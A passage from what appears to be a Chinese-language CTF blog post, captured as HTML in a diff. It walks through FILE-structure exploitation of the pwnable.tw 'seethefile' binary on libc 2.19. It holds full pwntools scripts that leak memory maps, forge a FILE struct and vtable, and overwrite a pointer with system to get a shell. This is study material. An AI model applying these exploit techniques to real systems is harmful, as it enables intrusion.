+<p>最後修改成這樣的 exploit code trace 下去<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./example&quot;)</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">buf = 0x601080</span><br><span class="line">buf2 = buf+0x500</span><br><span class="line">buf3 = buf+0x600</span><br><span class="line">offset = 256</span><br><span class="line">payload = cyclic(24) + p64(0) +&quot;b&quot;*(136-24-8) + p64(buf2) + cyclic(16) + p64(buf2) + cyclic(0x100-136-8-16-8) + p64(buf)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;hi&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_demo_7.png" alt=""><br>可以看到他停在 <code>call   QWORD PTR [rax+0x10]</code>，而 rax 是我們可控的，到這邊為止就實現了任意跳轉的攻擊手法了，最後說一下 buf2 是我隨意找的裡面全為 0 的記憶體位置 (bss)</p>
+<h2 id="seethefile-x64-libc-2-19"><a href="#seethefile-x64-libc-2-19" class="headerlink" title="seethefile (x64, libc 2.19)"></a>seethefile (x64, libc 2.19)</h2><p>這一題是 pwnable.tw 上面的題目，在網站上找的到 binary</p>
+<p>我這邊有稍微改過 print 的內容，但攻擊上基本上一樣</p>
+<p>示範一下<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_1.png" alt=""></p>
+<p>首先針對各個功能寫好相關 function</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./seethefile&quot;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.19.so&quot;)</span><br><span class="line">system_offset = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(system_offset)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">def openfile(filename):</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;filename: &quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(filename)</span><br><span class="line">    io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">def readfile():</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">def writefile():</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def exitfile(data):</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(data)</span><br></pre></td></tr></table></figure>
+<p>再來可以透過開啟 <code>/proc/self/maps</code><br>就可以得到當前 process 的 memory maps</p>
+<p>透過讀取 memory maps 可以取得 libc base 和 code base</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">openfile(&quot;/proc/self/maps&quot;)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">raw = io.recvuntil(&#x27;r&#x27;).split(&#x27;-&#x27;)</span><br><span class="line">code_base = int(raw[1][:-2], 16)</span><br><span class="line">io.recvuntil(&quot;[heap]&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line">raw = io.recvuntil(&quot;-7f&quot;)</span><br><span class="line">libc_base = int(raw[:-3], 16)</span><br><span class="line">log.info(&quot;code base is 0x%x&quot;, code_base)</span><br><span class="line">log.info(&quot;libc base is 0x%x&quot;, libc_base)</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">log.info(&quot;system address is 0x%x&quot;, system)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_2.png" alt=""></p>
+<p>再來我們的攻擊思路就是，先得到 overflow offset 是多少<br>這邊用 cyclic 測一下之後得知是 256<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_3.png" alt=""><br>而且可以注意的是，錯誤資訊指向的是 <code>fp=0x6262626262626262</code></p>
+<p>所以這邊我們把 <code>bbbbbbbb</code>，改成一個 <code>FILE</code> 型別的位置<br>一樣透過 gdb 找一下<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_4.png" alt=""></p>
+<p>所以我把 payload 改成 <code>payload = cyclic(0x100) + p64(buf)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./seethefile&quot;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.19.so&quot;)</span><br><span class="line">system_offset = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(system_offset)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">def openfile(filename):</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;filename: &quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(filename)</span><br><span class="line">    io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">def readfile():</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">def writefile():</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def exitfile(data):</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">openfile(&quot;/proc/self/maps&quot;)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">raw = io.recvuntil(&#x27;r&#x27;).split(&#x27;-&#x27;)</span><br><span class="line">code_base = int(raw[1][:-2], 16)</span><br><span class="line">io.recvuntil(&quot;[heap]&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line">raw = io.recvuntil(&quot;-7f&quot;)</span><br><span class="line">libc_base = int(raw[:-3], 16)</span><br><span class="line">log.info(&quot;code base is 0x%x&quot;, code_base)</span><br><span class="line">log.info(&quot;libc base is 0x%x&quot;, libc_base)</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">log.info(&quot;system address is 0x%x&quot;, system)</span><br><span class="line">io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">buf = code_base + 0x3060</span><br><span class="line">log.info(&quot;buf address is 0x%x&quot;, buf)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x100) + p64(buf)</span><br><span class="line">exitfile(payload)</span><br><span class="line">io.interative()</span><br></pre></td></tr></table></figure>
+<p><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_5.png" alt=""></p>
+<p>接下來就一樣是一直滿足要求，這邊我拿 <code>buf2 = buf + 0x630</code> 當作我第二個 buf address，這邊是一個 vaild address 且內容都是 0<br>以此解決 access violation 的問題</p>
+<p>最後送這行<br><code>payload = &quot;a&quot;*24 + p64(0) +  cyclic(136-24-8) + p64(buf2) + cyclic(16) + p64(buf2) +  cyclic(0x100-136-8-16-8) + p64(buf)</code><br>成功到了 <code>call [rax+0x10]</code> 的地方<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_6.png" alt=""><br>再來需要找 vtable 讓我可以構造一個 vtable 的位置讓程式進行轉跳，剛好在上面的圖內其實就有 vtable 的位置了，且該位置是我們可控的<br>為什麼這麼說呢 ? 從原始碼來看對應的程式碼大概在這個位置<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_7.png" alt=""><br>所以其實可以看到 <code>RDI</code> 指向的位置是 <code>fp</code> 的位置，也就是 <code>RBX</code> 指向的位置，因此 <code>RBX+0xd8</code> 就是 vtable 的 base address，而 <code>RBX+0xe8</code> 就是 <code>_IO_deallocate_file</code> 的位址了<br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_8.png" alt=""></p>
+<p>到這邊的思路就蠻清楚的了，將 <code>fp</code> 的位置內寫入 <code>/bin/sh\x00</code> 然後在 <code>RBX+0xe8</code> 的地方改成 <code>system</code> 的位置，最後 overflow 就結束了<br>但過程中一值不順遂，經過與大大的交流後得知 <code>fp</code> 的開頭不能直接用 <code>/bin/sh</code> 蓋掉，但可以用 <code>A</code> 蓋掉沒問題，這個我也搞不清楚，然後因為開頭被 <code>A</code> 蓋掉，所以如果我後面接 <code>/bin/sh</code> 的話就會變成 <code>AAAAAAAA/bin/sh</code> 了，如果多加了分號的話又會有沒對齊 8 byte 的麻煩，最後照大大的建議用 <code>;sh;aaaa</code>，這樣子過關，既不會被頭尾的 padding 影響到又可以成功叫出 shell</p>
+<p>最後的 payload 是這樣構建的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;/bin/sh;&quot; + &quot;a&quot;*16 + p64(0) +  cyclic(136-24-8) + p64(buf2) + cyclic(16) + p64(buf2)</span><br><span class="line">payload = payload.ljust(0xd8, &quot;A&quot;) + p64(vtable_addr)</span><br><span class="line">payload = payload.ljust(0x100, &quot;A&quot;) + p64(buf)</span><br><span class="line">payload = payload + &quot;c&quot; *0x10 + p64(system)</span><br></pre></td></tr></table></figure><br>注意除了填滿 0x100 讓他 overflow 之外，還要多蓋 0x10 個 padding 再蓋 <code>system address</code>，再讓他能讀取到 <code>rax+0x10</code> 的位置</p>
+<p>最終 exploit code<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./seethefile&quot;)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.19.so&quot;)</span><br><span class="line">system_offset = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(system_offset)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">def openfile(filename):</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;filename: &quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(filename)</span><br><span class="line">    io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">def readfile():</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line"></span><br><span class="line">def writefile():</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def exitfile(data):</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">openfile(&quot;/proc/self/maps&quot;)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">raw = io.recvuntil(&#x27;r&#x27;).split(&#x27;-&#x27;)</span><br><span class="line">code_base = int(raw[1][:-2], 16)</span><br><span class="line">io.recvuntil(&quot;[heap]&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line">raw = io.recvuntil(&quot;-7f&quot;)</span><br><span class="line">libc_base = int(raw[:-3], 16)</span><br><span class="line">log.info(&quot;code base is 0x%x&quot;, code_base)</span><br><span class="line">log.info(&quot;libc base is 0x%x&quot;, libc_base)</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">log.info(&quot;system address is 0x%x&quot;, system)</span><br><span class="line">io.recvuntil(&quot;choice:&quot;)</span><br><span class="line">io.recvline()</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">buf = code_base + 0x3060</span><br><span class="line">vtable_addr = buf + 0x108</span><br><span class="line">buf2 = buf+0x630</span><br><span class="line">log.info(&quot;buf address is 0x%x&quot;, buf)</span><br><span class="line">payload = &quot;A&quot;*8 + &quot;;sh;aaaa&quot; + &quot;a&quot;*8 + p64(0) +  cyclic(136-24-8) + p64(buf2) + cyclic(16) + p64(buf2)</span><br><span class="line">payload = payload.ljust(0xd8, &quot;A&quot;) + p64(vtable_addr)</span><br><span class="line">payload = payload.ljust(0x100, &quot;A&quot;) + p64(buf)</span><br><span class="line">payload = payload + &quot;c&quot; *0x10 + p64(system)</span><br><span class="line"></span><br><span class="line">exitfile(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br><img src="/img/2021/linux_file_exploit/linux_file_exploit_seethefile_2.19_9.png" alt=""></p>
+<h2 id="seethefile-x64-libc-2-30"><a href="#seethefile-x64-libc-2-30" class="headerlink" title="seethefile (x64, libc 2.30)"></a>seethefile (x64, libc 2.30)</h2><p>[TODO]</p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/sda06407" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2022 AStar<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
